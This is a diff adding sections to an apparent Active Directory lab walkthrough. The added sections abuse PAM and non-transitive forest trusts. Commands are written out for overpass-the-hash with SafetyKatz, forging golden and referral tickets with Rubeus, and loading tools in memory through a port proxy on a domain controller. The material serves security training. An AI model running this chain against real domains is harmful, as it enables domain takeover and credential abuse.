@@ -1364,7 +1364,7 @@ Get-DomainUser -Domain dbvendor.local | ?{$_.ObjectSid -eq 'S-1-5-21-569087967-1
 
 which is the user that we previously pwn, so we are administrator in the domain
 
-## Flag 55 - PAM trust
+## Flag 55 to 58 - PAM trust
 
 Enumerate FSPs on bastion.local to check if there is anything interesting with AD-Module:
 
@@ -1428,5 +1428,129 @@ Now with AD-Module check if there is any PAM trust:
 {% code overflow="wrap" %}
 ```powershell
 Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/immagine (39).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+If we try to access production.local from the session on bastion.local using techcorp Administrator we will face the double hop issue, so we need to use Overpass-the-hash Administrator of bastion.local.
+{% endhint %}
+
+To enumerate production.local with DA of bastion.local
+
+{% code overflow="wrap" %}
+```powershell
+Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)} -Server production.local
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/immagine (40).png" alt=""><figcaption></figcaption></figure>
+
+So we now know that SID History is allowed for access from bastion.local to production.local.
+
+Check the membership of Shadow Security Principals on bastion.local:
+
+{% code overflow="wrap" %}
+```powershell
+Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/immagine (41).png" alt=""><figcaption></figcaption></figure>
+
+That is, the Administrator of bastion.local has Enterprise Admin privileges on production.local.
+
+Now, we can access the production.local DC as domain administrator of bastion.local from our current domain us.techcorp.local. Note that production.local has no DNS entry or trust with our current domain us.techcorp.local and we need to use IP address of DC of production.local to access it.
+
+```powershell
+Get-DnsServerZone -ZoneName production.local |fl *
+```
+
+192.168.102.1
+
+To use PowerShell Remoting to connect to an IP address, we must modify the WSMan Trustedhosts property on the student VM.
+
+```powershell
+Set-Item WSMan:\localhost\Client\TrustedHosts * -Force
+```
+
+{% hint style="warning" %}
+To connect to an ip address you need the NTLM hash and not aes
+{% endhint %}
+
+Now craft a tgt with the ntlm of administrator of bastion.local
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::opassth /user:administrator /domain:bastion.local /ntlm:f29207796c9e6829aa1882b7cccfa36d /run:powershell.exe" "exit"
+```
+{% endcode %}
+
+and now enter the session
+
+```powershell
+Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
+```
+
+<figure><img src="../.gitbook/assets/immagine (42).png" alt=""><figcaption></figcaption></figure>
+
+## Flag N/A- Abuse non-transitive trust
+
+Using DA access to eu.local, abuse the bidirectional non-transitive trust from eu.local to us.techcorp.local to gain unintended transitive access the forest root - techcorp.local.
+
+Crate a golden ticket as DA of eu.local
+
+{% code overflow="wrap" %}
+```
+C:\AD\Tools\Rubeus.exe golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /aes256:b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d /nowrap /ptt
+```
+{% endcode %}
+
+Copy Loader.exe and enable port forwarding to download Rubeus in the memory on eu-dc.
+
+{% code overflow="wrap" %}
+```
+echo F | xcopy C:\AD\Tools\Loader.exe \\eu-dc.eu.local\C$\Users\Public\Loader.exe /Y
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.64
+```
+{% endcode %}
+
+Now using Rubeus in the eu-dc session, we can now request a referral TGT for us.techcorp.local from eu.local leveraging the bidirectional non-transitive trust.
+
+with asktgs
+
+{% code overflow="wrap" %}
+```
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /service:krbtgt/us.techcorp.local /dc:eu-dc.eu.local /nowrap /ticket:previous golden
+```
+{% endcode %}
+
+Since the trust isn't transitive, we cannot request a referral from eu.local to the forest root - techcorp.local. Instead we can now attempt to create a "local" TGT (service realm is us.techorp.local) and then leverage it to gain a referral TGT from us.techcorp.local to techcorp.local leveraging the child to forest bidirectional trust. Create a "local" TGT in the eu-dc session using the /targetdomain parameter as us.techcorp.local and the above referral TGT in the /ticket parameter.
+
+{% code overflow="wrap" %}
+```
+C:\Users\Administrator>C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args asktgs /service:krbtgt/us.techcorp.local /dc:us-dc.us.techcorp.local /targetdomain:us.techcorp.local /nowrap /ticket:doIFVjCCBVKg...
+```
+{% endcode %}
+
+We can now finally request a referral TGT in the eu-dc session for techcorp.local from us.techcorp.local abusing the child to forest bidirectional trust. Note to use the above "local" TGT in the following /ticket parameter.
+
+{% code overflow="wrap" %}
+```
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /service:krbtgt/techcorp.local /dc:us-dc.us.techcorp.local /targetdomain:us.techcorp.local /nowrap /ticket:doIFaDCCB...
+```
+{% endcode %}
+
+Finally, request a usable TGS in the eu-dc session to gain access onto any target service (CIFS in this case) on techcorp.local. Use the above child to forest referral TGT in the /ticket parameter.
+
+{% code overflow="wrap" %}
+```
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /service:CIFS/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /nowrap /ptt /ticket:doIFczCCBW...
 ```
 {% endcode %}
